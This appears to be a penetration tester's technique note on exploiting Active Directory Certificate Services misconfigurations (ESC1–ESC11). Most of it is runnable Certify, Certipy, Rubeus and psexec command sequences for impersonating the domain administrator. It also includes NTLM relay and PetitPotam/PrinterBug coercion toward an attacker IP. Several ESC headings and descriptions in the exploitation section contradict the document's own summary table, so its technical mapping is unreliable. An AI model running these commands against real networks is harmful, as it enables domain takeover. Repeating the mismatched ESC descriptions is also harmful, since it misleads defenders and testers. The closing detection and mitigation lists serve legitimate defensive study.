---
tags:
  - "#type/technique"
  - "#tactic/TA0004"
  - "#technique/T1068"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#service/pki"
  - "#tool/certipy"
  - "#tool/certify"
aliases:
  - ADCS Vulnerabilities
  - Active Directory Certificate Services
  - Certificate Template Abuse
  - ESC1
  - ESC2
  - ESC3
  - ESC4
  - ESC5
  - ESC6
  - ESC7
  - ESC8
  - ESC9
  - ESC10
  - ESC11
---

## Technique
___

Active Directory Certificate Services (ADCS) is Microsoft's Public Key Infrastructure (PKI) implementation that provides certificate-based functionalities to users and machines within a domain. However, misconfigurations in ADCS can lead to various privilege escalation vulnerabilities collectively known as ESC (Escalation via Certificates) vulnerabilities.

These vulnerabilities, when exploited, can allow attackers to:
- Obtain certificates for any user/computer in the domain
- Impersonate other users, including domain administrators
- Authenticate to services using certificate-based authentication
- Escalate privileges within the domain

## Prerequisites
___

**Access Level:** Varies by vulnerability (some require domain user, others just network access)

**System State:** Active Directory Certificate Services deployed in the domain

**Tools:** Certify, Certipy, Rubeus, PKINITtools, ADCS-Attack, Impacket

## Enumeration
___

### Discovering ADCS Infrastructure

**Windows (Local):**
```powershell
# Using Certify
Certify.exe cas

# Using PowerShell
Get-ADObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties *
Get-ADObject -LDAPFilter "(objectCategory=pKICertificateTemplate)" -Properties *
```

**Linux (Remote):**
```bash
# Using Certipy
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -stdout

# Using ldapsearch
ldapsearch -H ldap://dc.domain.local -D "user@domain.local" -w Password123 -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" "(objectClass=pKIEnrollmentService)"

# Using netexec
nxc ldap dc.domain.local -u user -p Password123 -M adcs
```

### Identifying Vulnerable Templates

**Windows (Local):**
```powershell
# Using Certify
Certify.exe find /vulnerable

# Checking specific ESC vulnerabilities
Certify.exe find /vulnerable /exploit
```

**Linux (Remote):**
```bash
# Using Certipy
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -vulnerable

# Full ADCS enumeration
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -stdout -debug
```

### Checking Certificate Authority Access Rights

**Windows (Local):**
```powershell
# Using Certify
Certify.exe find /ca

# Check ACLs on CA objects
Get-ADObject -Identity "CN=CA-NAME,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Properties nTSecurityDescriptor | Select-Object -ExpandProperty nTSecurityDescriptor
```

**Linux (Remote):**
```bash
# Using Certipy
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -ca
```


| ESC Number | Vulnerability Description                       | Key Requirements                                                                                                              | Primary Tool(s)                  |
| ---------- | ----------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- | -------------------------------- |
| **ESC1**   | User impersonation via enrollee-supplied SAN    | - `Client Authentication` EKU - `Enrollee Supplies Subject` enabled - Low-privilege `Enroll` rights - No manager approval     | `certipy req`                    |
| **ESC2**   | User impersonation via "Any Purpose" EKU        | - `Any Purpose` EKU (or no EKU) - `Enrollee Supplies Subject` enabled - Low-privilege `Enroll` rights - No manager approval   | `certipy req` (two-stage)        |
| **ESC3**   | User impersonation via Enrollment Agent EKU     | - `Certificate Request Agent` EKU - `Enrollee Supplies Subject` enabled - Low-privilege `Enroll` rights - No manager approval | `certipy req -on-behalf-of`      |
| **ESC4**   | Template modification via weak ACLs             | - `WriteOwner`, `WriteDacl`, `WriteProperty`, or `GenericAll` on template object for a low-privilege user                     | `certipy template`               |
| **ESC5**   | PKI object modification via weak container ACLs | - Dangerous permissions on PKI containers in AD (e.g., `CN=Public Key Services`)                                              | ADSI Edit, PowerShell AD module  |
| **ESC6**   | CA-level SAN abuse                              | - `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled on CA - Any template with `Client Auth` EKU and low-privilege `Enroll` rights | `certipy req`                    |
| **ESC7**   | CA takeover via weak CA permissions             | - `ManageCA` or `ManageCertificates` permissions on CA object for a low-privilege user                                        | `certipy ca`                     |
| **ESC8**   | NTLM relay to web enrollment                    | - Web Enrollment (`/certsrv`) enabled - NTLM authentication accepted - No EPA or HTTPS enforcement                            | `ntlmrelayx.py`, `certipy relay` |

## Execution
___

### ESC1: User impersonation via enrollee-supplied SAN

**Vulnerability:** Certificate templates with dangerous settings like:
- Client Authentication EKU enabled
- ENROLLEE_SUPPLIES_SUBJECT flag set
- No manager approval required
- Domain Users have enrollment rights

> [!NOTE]
> **Prerequisites:** Domain user account with enrollment rights to the vulnerable template.

**Exploitation:**

**Windows:**
```powershell
# Using Certify
Certify.exe find /vulnerable

# Request certificate using vulnerable template
Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:administrator

# Convert certificate to PFX format (may happen automatically with Certify)
# If you have a certificate file:
CertUtil -exportPFX -p "Password123" CertificateFile.cer OutputFile.pfx

# Using the certificate with Rubeus
Rubeus.exe asktgt /user:administrator /certificate:OutputFile.pfx /password:Password123 /ptt
```

**Linux:**
```bash
# Using Certipy
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10

# Request certificate using vulnerable template
certipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'VulnTemplate' -dc-ip 10.10.10.10

# Convert certificate to pfx (if needed)
certipy cert -pfx user.pfx -password 'Password123' -username 'administrator' -domain 'domain.local'

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Alternative: Using gettgtpkinit from PKINITtools
gettgtpkinit -cert-pfx administrator.pfx -pfx-pass Password123 domain.local/administrator administrator.ccache

# Use the TGT
export KRB5CCNAME=administrator.ccache
impacket-psexec domain.local/administrator@dc.domain.local -k -no-pass
```

### ESC2: Misconfigured Certificate Template Access Control

**Vulnerability:** Certificate templates with over-permissive ACLs allowing users to modify settings

> [!NOTE]
> **Prerequisites:** Domain user account with write permissions on certificate templates.
> 
> **Caution:** Modifying template settings is a visible change that could be detected and may disrupt legitimate certificate issuance. Consider restoring original settings after exploitation.

**Exploitation:**

**Windows (Local):**
```powershell
# Using Certify to find templates with weak ACLs
Certify.exe find /vulnerable

# Manual modification using PowerShell
# This is complex and requires deep AD schema knowledge
# Example of enabling ENROLLEE_SUPPLIES_SUBJECT flag:
$template = Get-ADObject -Identity "CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Properties *
$newValue = $template.'msPKI-Certificate-Name-Flag' -bor 1
Set-ADObject -Identity $template.DistinguishedName -Replace @{'msPKI-Certificate-Name-Flag'=$newValue}

# Use the modified template as in ESC1
Certify.exe request /ca:CA-NAME /template:TargetTemplate /altname:administrator
```

**Linux (Remote):**
```bash
# Enumerate ACLs on certificate templates
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -stdout -vulnerable

# If you have write access to a template, modify it to be vulnerable
certipy template -u user@domain.local -p Password123 -template 'TargetTemplate' -save-old

# Request certificate using the modified template
certipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'TargetTemplate' -alt 'administrator@domain.local'

# After exploitation, restore the original template
certipy template -u user@domain.local -p Password123 -template 'TargetTemplate' -restore
```

### ESC3: Enrollment Agent Templates

**Vulnerability:** Certificate templates that allow users to enroll on behalf of other users

> [!NOTE]
> **Prerequisites:** 
> - Access to an Enrollment Agent certificate
> - The CA must have a template with the Certificate Request Agent EKU
> - Permission to enroll in both templates

**Exploitation:**

**Windows (Local):**
```powershell
# Using Certify
# Request enrollment agent certificate
Certify.exe request /ca:CA-NAME /template:EnrollmentAgentTemplate

# Request certificate on behalf of another user
# This typically requires Windows Certificate MMC or web enrollment
# More complex to automate in PowerShell
```

**Linux (Remote):**
```bash
# Request enrollment agent certificate
certipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'EnrollmentAgentTemplate'

# Request certificate on behalf of another user
certipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'UserTemplate' -on-behalf-of 'administrator@domain.local' -pfx enrollment-agent.pfx
```

### ESC4: Vulnerable Certificate Authority Access Control

**Vulnerability:** Over-permissive ACLs on the Certificate Authority itself

> [!WARNING]
> **Prerequisites:** Domain user with manage CA permissions.
> 
> **Impact:** This exploitation modifies CA settings, which can have significant operational impact on the PKI infrastructure. Changes should be reverted after testing.

**Exploitation:**

**Windows (Local):**
```powershell
# Using Certify to enumerate CA permissions
Certify.exe find /ca

# Using certutil to enable a template
certutil -config "CA-NAME\domain-DC-CA" -template +VulnTemplate

# After exploitation, disable the template
certutil -config "CA-NAME\domain-DC-CA" -template -VulnTemplate
```

**Linux (Remote):**
```bash
# Enumerate CA permissions
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -ca

# If manage CA permission, enable vulnerable template:
certipy ca -u user@domain.local -p Password123 -ca 'CA-NAME' -enable-template 'VulnTemplate'

# After exploitation, disable the template
certipy ca -u user@domain.local -p Password123 -ca 'CA-NAME' -disable-template 'VulnTemplate'
```

### ESC5: Vulnerable Certificate Authority Enrollment Access Control

**Vulnerability:** Certificate Authority with dangerous enrollment policies

> [!NOTE]
> **Prerequisites:** Write permissions on CA enrollment policies.
> 
> **Caution:** Modifying enrollment policies may disrupt legitimate certificate operations.

**Exploitation:** Similar to ESC4, focuses on enrollment access controls rather than management access controls.

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Set

**Vulnerability:** CA configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing subject alternative name manipulation

> [!NOTE]
> **Prerequisites:** The CA must have the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.
> 
> **Detection Risk:** This attack doesn't modify settings but can create detectable certificate requests.

**Exploitation:**

**Windows (Local):**
```powershell
# Check if flag is enabled using certutil
certutil -config "CA-NAME\domain-DC-CA" -getreg policy\EditFlags
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000) in the flags

# Using Certify
Certify.exe request /ca:CA-NAME /template:User /altname:administrator
```

**Linux (Remote):**
```bash
# Check if flag is enabled
certipy find -u user@domain.local -p Password123 -ca

# Request certificate with alternative name
certipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'User' -san 'administrator@domain.local'
```

### ESC7: Vulnerable Certificate Authority Enrollment Service Access Control

**Vulnerability:** Misconfigured access controls on the web enrollment service

> [!NOTE]
> **Prerequisites:** 
> - Web enrollment must be enabled
> - User must have enrollment permissions

**Exploitation:**

**Windows (Local):**
```powershell
# Using Certify to check web enrollment
Certify.exe find

# Typically requires manual exploitation via browser
# Navigate to https://ca-server/certsrv/
# Request certificate > advanced certificate request > submit PKCS #10 request
```

**Linux (Remote):**
```bash
# Enumerate web enrollment permissions
certipy find -u user@domain.local -p Password123 -web-enrollment

# If vulnerable, generate certificate request and submit via the enrollment service
# This may require custom scripting to interact with the web enrollment interface
```

### ESC8: NTLM Relay to Active Directory Certificate Services Web Enrollment

**Vulnerability:** NTLM authentication on the Certificate Enrollment Web Service can be relayed

> [!WARNING]
> **Prerequisites:** 
> - Web enrollment must use NTLM authentication
> - No EPA (Extended Protection for Authentication)
> - No HTTPS enforced
> 
> **Impact:** Requires triggering NTLM authentication from a privileged account, which may create logs and alerts.

**Exploitation:**

**Windows (Local):**
```powershell
# From Windows, you typically need multiple tools
# 1. Set up Inveigh for NTLM capturing and relaying
Import-Module .\Inveigh.ps1
Inveigh-Relay -ConsoleOutput Y -Target http://adcs.domain.local/certsrv/ -Attack ADCS

# 2. Coerce authentication from a target
# Using SpoolSample, PetitPotam, or other authentication coercion technique
.\PetitPotam.exe -d domain.local -u user -p password ATTACKER-IP DC-IP
```

**Linux (Remote):**
```bash
# Set up relay attack with ntlmrelayx
ntlmrelayx.py -t http://adcs.domain.local/certsrv/ -smb2support --adcs

# Coerce authentication from target using Impacket tools
# Using PetitPotam (MS-EFSRPC) coercion
impacket-petitpotam -d domain.local -u user -p password ATTACKER-IP DC-IP

# Or using PrinterBug (MS-RPRN) coercion
impacket-printerbug domain.local/user:password@DC-IP ATTACKER-IP
```

### ESC9: No Security Extension

**Vulnerability:** Templates without security extensions allowing for certificate misuse

> [!NOTE]
> **Prerequisites:** Access to templates without proper security extensions.

**Exploitation:**

**Windows (Local):**
```powershell
# Using Certify
Certify.exe find /vulnerable

# Request certificate from vulnerable template
Certify.exe request /ca:CA-NAME /template:VulnTemplate

# Use for unintended authentication scenarios
```

**Linux (Remote):**
```bash
# Request certificate without security extensions
certipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'VulnTemplate'

# Use for unintended authentication scenarios
```

### ESC10: Certificate Authority Configuration Disclosure

**Vulnerability:** Disclosure of CA configuration information to unprivileged users

> [!NOTE]
> **Prerequisites:** Network access to the CA.
> 
> **Impact:** Passive information gathering only, no system changes.

**Exploitation:** Information gathered can be used to identify other vulnerabilities and aid in attacks.

### ESC11: Subject Alternative Name Untrusted Values

**Vulnerability:** Certain certificate fields are not properly validated

> [!NOTE]
> **Prerequisites:** Access to templates that don't properly validate SAN fields.
> 
> **Detection Risk:** Creates certificate requests that may be logged and detected.

**Exploitation:**

**Windows (Local):**
```powershell
# Using Certify
Certify.exe request /ca:CA-NAME /template:User /altname:administrator
```

**Linux (Remote):**
```bash
# Request certificate with manipulated alternative name values
certipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'User' -san 'administrator@domain.local'
```

## Detection & Mitigation
___

### Detection

- Monitor certificate issuance, especially for sensitive principals
- Look for unusual certificate request patterns
- Audit certificate template modifications
- Monitor for the use of certificates for authentication
- Watch for changes to CA configuration settings
- Review logs for suspicious certificate enrollments

### Mitigation

**General Mitigations:**
- Apply the principle of least privilege to CA and template permissions
- Require manager approval for sensitive certificate templates
- Implement proper access controls on certificate enrollment
- Use strong authentication for certificate enrollment
- Regularly audit certificate templates and CA configurations

**ESC1-specific:**
- Remove the ENROLLEE_SUPPLIES_SUBJECT flag from templates
- Restrict enrollment rights to necessary groups only
- Disable vulnerable templates

**ESC2-specific:**
- Review and restrict ACLs on certificate templates
- Remove unnecessary write permissions
- Implement approval requirements for template modifications

**ESC3-specific:**
- Restrict enrollment agent templates to necessary users only
- Require manager approval for certificates issued by enrollment agents
- Monitor the use of enrollment agent certificates

**ESC4/ESC5-specific:**
- Review and restrict ACLs on the CA
- Monitor for changes to CA configuration
- Implement approval workflows for CA modifications

**ESC6-specific:**
- Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA
- If the flag is required, implement additional validation

**ESC7-specific:**
- Restrict access to web enrollment interfaces
- Implement strong authentication for web enrollment
- Use certificate enrollment policies

**ESC8-specific:**
- Enable Extended Protection for Authentication (EPA)
- Require HTTPS for certificate enrollment
- Implement SMB signing and LDAP signing
- Disable NTLM where possible and use Kerberos

**ESC9-specific:**
- Ensure all templates include appropriate security extensions
- Review certificate usage in the environment
- Implement certificate issuance policies

**ESC10-specific:**
- Restrict access to CA configuration information
- Implement proper information disclosure controls
- Use access control to limit who can query CA configurations

**ESC11-specific:**
- Validate all certificate fields properly
- Implement proper input validation for certificate requests
- Use application policies to restrict certificate usage